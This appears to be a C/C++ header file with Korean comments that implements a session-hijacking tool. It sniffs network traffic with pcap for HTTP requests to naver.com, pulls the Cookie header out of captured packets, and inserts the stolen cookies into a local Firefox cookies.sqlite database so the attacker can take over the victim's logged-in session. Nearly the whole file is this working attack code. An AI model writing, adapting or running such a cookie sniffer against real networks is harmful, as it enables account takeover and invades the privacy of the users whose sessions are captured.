#ifndef COOKIE_HPP
#define COOKIE_HPP
#ifndef COOKIE_H
#define COOKIE_H


void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void Call_Device(char **C_dev);
int  Pcap_init(char **P_dev, pcap_t **P_handle);
int Lib_init(libnet_t **L_libhandle,char **L_dev);
void delete_cookie_fuc();

static int callback(void *data, int argc, char **argv, char **azColName);


int flag=0,delete_cookie,print_sql,id = 1,len,j=0,end=0,start=0,kv_flag=0,kv_len=0,insert_flag=1,injection_flag=0;
char *dev,*zErrMsg = 0,*key,*value,*drop_sql="delete from moz_cookies;" ,*insert_sql = "INSERT INTO moz_cookies VALUES (",*baseDomain= ",'naver.com',' ','",* name_h="','",* value_cookie_h="',",* insert_sql2 = "'.naver.com','/',3046267007,1468430207929792,1468430211263527,0,0,0,0);",* value_cookie,* name;
const char* data = "Callback function called";
pcap_t *handle;
libnet_t *lib_handle, *infect_packet;
sqlite3 *db;


void delete_cookie_fuc()
{
    int rc=sqlite3_open("/root/.mozilla/firefox/4i1urpoz.default/cookies.sqlite",&db);

    if(rc)
    {
        printf("\n/root/.mozilla/firefox/4i1urpoz.default/cookies.sqlite를 열지 못했습니다.\n");
        exit -1;
    }

    printf("기존의 cookie값을 지우고 진행하시겠습니까?(예[1],아닐시, 아무키 입력): ");
    scanf("%d",&delete_cookie);

    if(delete_cookie==1)
    {
        rc = sqlite3_exec(db, drop_sql, callback, (void*)data, &zErrMsg);
        printf("\t\t\t\t\t\t\t\t   Cookie Delete \t\t\t\t\t\t\t\t\t    <OK>\n");
    }

    sqlite3_close(db);

}

void Call_Device(char **C_dev)
{
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int i=0;
    char Select_device[10];
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevs, errbuf) == -1)
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);

    for(d=alldevs;d;d=d->next)
        printf("%d. %s \n", ++i, d->name);

    if(i==0)
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
    printf("\nSelect Device: ");
    scanf("%s",&Select_device);

    *C_dev=Select_device;

    pcap_freealldevs(alldevs);
}

int  Pcap_init(char **P_dev, pcap_t ** P_handle)
{
    char pcap_errbuf[PCAP_ERRBUF_SIZE];

    if((*P_handle=pcap_open_live(*P_dev,BUFSIZ,1,1000,pcap_errbuf))==NULL)//Handle Open!
    {
        printf("Pcap_Open_Live Error!!!\n");
        return 1;
    }

    printf("\t\t\t\t\t\t\t\t  Pcap_Open_Live \t\t\t\t\t\t\t\t\t    <OK>\n");
}


void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *p)
{

    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p;

    if(ntohs(p_ether->ether_type)==ETHERTYPE_IP)
    {

        libnet_ipv4_hdr * p_ip = (libnet_ipv4_hdr *)(p+sizeof(libnet_ethernet_hdr));

        if(p_ip->ip_p == IPPROTO_TCP)
        {
            libnet_tcp_hdr * p_tcp = (libnet_tcp_hdr *)(p+sizeof(libnet_ethernet_hdr)+((p_ip->ip_hl)*4));
            int tcp_header_len = p_tcp->th_off * 4;
            int tcp_data_len = ntohs(p_ip->ip_len)-sizeof(libnet_ipv4_hdr) - tcp_header_len;

            char *tcp_data = (char *)(p_tcp)+tcp_header_len; // tcp_data = HTTP

            char * login_cookie = strstr(tcp_data,"GET /include/newsstand/press_info.json HTTP/1.1");

            if(login_cookie!=NULL) flag=1;

            if(flag==1)
            {
                if(login_cookie!=NULL)
                {
                    char * login_naver_cookie=strstr(login_cookie,"Cookie: ");
                    char * ptr = strtok(login_naver_cookie+strlen("Cookie: "),"\r\n");

                    if(strlen(ptr)>=800)
                    {
                        int rc=sqlite3_open("/root/.mozilla/firefox/4i1urpoz.default/cookies.sqlite",&db);

                        if(rc)
                        {
                            printf("\n/root/.mozilla/firefox/4i1urpoz.default/cookies.sqlite를 열지 못했습니다.\n");
                            exit -1;
                        }

                        else
                            printf("/root/.mozilla/firefox/4i1urpoz.default/cookies.sqlite열기 성공!!\n");


                        printf("\nSQL문을 출력하시겠습니까?(예[1],아닐시, 아무키 입력): ");
                        scanf("%d",&print_sql);


                        int count=strlen(ptr);
                        int cookie_count=1;

                        char *len = (char *)malloc((strlen(ptr)*sizeof(char)));
                        memcpy(len,ptr,strlen(ptr));

                       // for(int i=0;i<strlen(ptr);i++)
                       //    printf("%c",len[i]); //메모리 출력
                       // printf("\n\nCopy Mem\n");

                        char arr[count];
                        char arr2[count];
                        memcpy(arr,len,count);

                   //     printf("Print Copy Mem\n");
                   //     for(int j=0;j<count;j++)
                   //         printf("%c",arr[j]);

                     //   printf("\n\nFinish Copy Mem \n\n");

                        char *naver_login_cookie=strtok(ptr,";");

                        while(naver_login_cookie!=NULL )
                        {
                            cookie_count++;
                            naver_login_cookie=strtok(NULL,"; ");
                        }


                     //   printf("======================\n;와 를제외한 패킷출력\n");


                        for(int i=0;i<count;i++)
                        {
                            if(arr[i]!=';')
                                arr2[j++]=arr[i];
                        } //;제거

                        for(int i=0;i<count;i++)
                        {
                             if(arr2[i]=='=')
                            {
                                if(arr2[i+1]!='=' && arr2[i+1]!=' ')
                                    arr2[i]=' ';
                            }
                        }// '='제거


                       // for(int j=0;j<count-cookie_count+2;j++)
                       //      printf("%c",arr2[j]);
                        //;와 =이 제거된 쿠키값들.

                        printf("\n"); //이제 키와 벨류값을 ' '로 구분해서 넣는다.


                        count=strlen(arr2);

                        for(int i=0; i<count;i++)
                        {
                            if(arr2[i]==' ')
                            {
                                if(kv_flag==0)
                                {
                                    key=strtok(arr2+kv_len," ");
                                    kv_len+=strlen(key);
                                    kv_flag=1;
                                    kv_len++;
                                    insert_flag++;
                                    name=key;
                                 }

                                else
                                {
                                    value=strtok(arr2+kv_len," \0");
                                    kv_len+=strlen(value);
                                    kv_len++;
                                    kv_flag=0;
                                    insert_flag++;
                                    value_cookie=value;
                                }

                                if(insert_flag==3)
                                {
                                    char *sqlite_query = (char *) malloc(1 + 1+ strlen(insert_sql)+ strlen(baseDomain)+ strlen(name)+strlen(name_h)+strlen(value_cookie)+ strlen(value_cookie_h)+strlen(insert_sql2));

                                    sprintf(sqlite_query,"%s%d%s%s%s%s%s%s",insert_sql,id,baseDomain,name,name_h,value_cookie,value_cookie_h,insert_sql2);

                                    if(print_sql==1)
                                        printf("%s\n",sqlite_query);

                                    rc = sqlite3_exec(db, sqlite_query, callback, (void*)data, &zErrMsg);

                                    id++;

                                    insert_flag=1;
                                    injection_flag++;
                                }
                            }
                         }
                    }
                    flag=0;
                }

                if(injection_flag!=0)
                {
                    sqlite3_close(db);
                    printf("/root/.mozilla/firefox/4i1urpoz.default/cookies.sqlite닫기 성공!!\n");
                    printf("\t\t\t\t\t\t\t\tCookie_Injection \t\t\t\t\t\t\t\t\t    <OK>\n");
                    pcap_close(handle);
                }

            }
         }
    }
}


static int callback(void *data, int argc, char **argv, char **azColName){
   int i;
   fprintf(stderr, "%s: ", (const char*)data);
   for(i=0; i<argc; i++){
      printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
   }
   printf("\n");
   return 0;
}




#endif
#endif
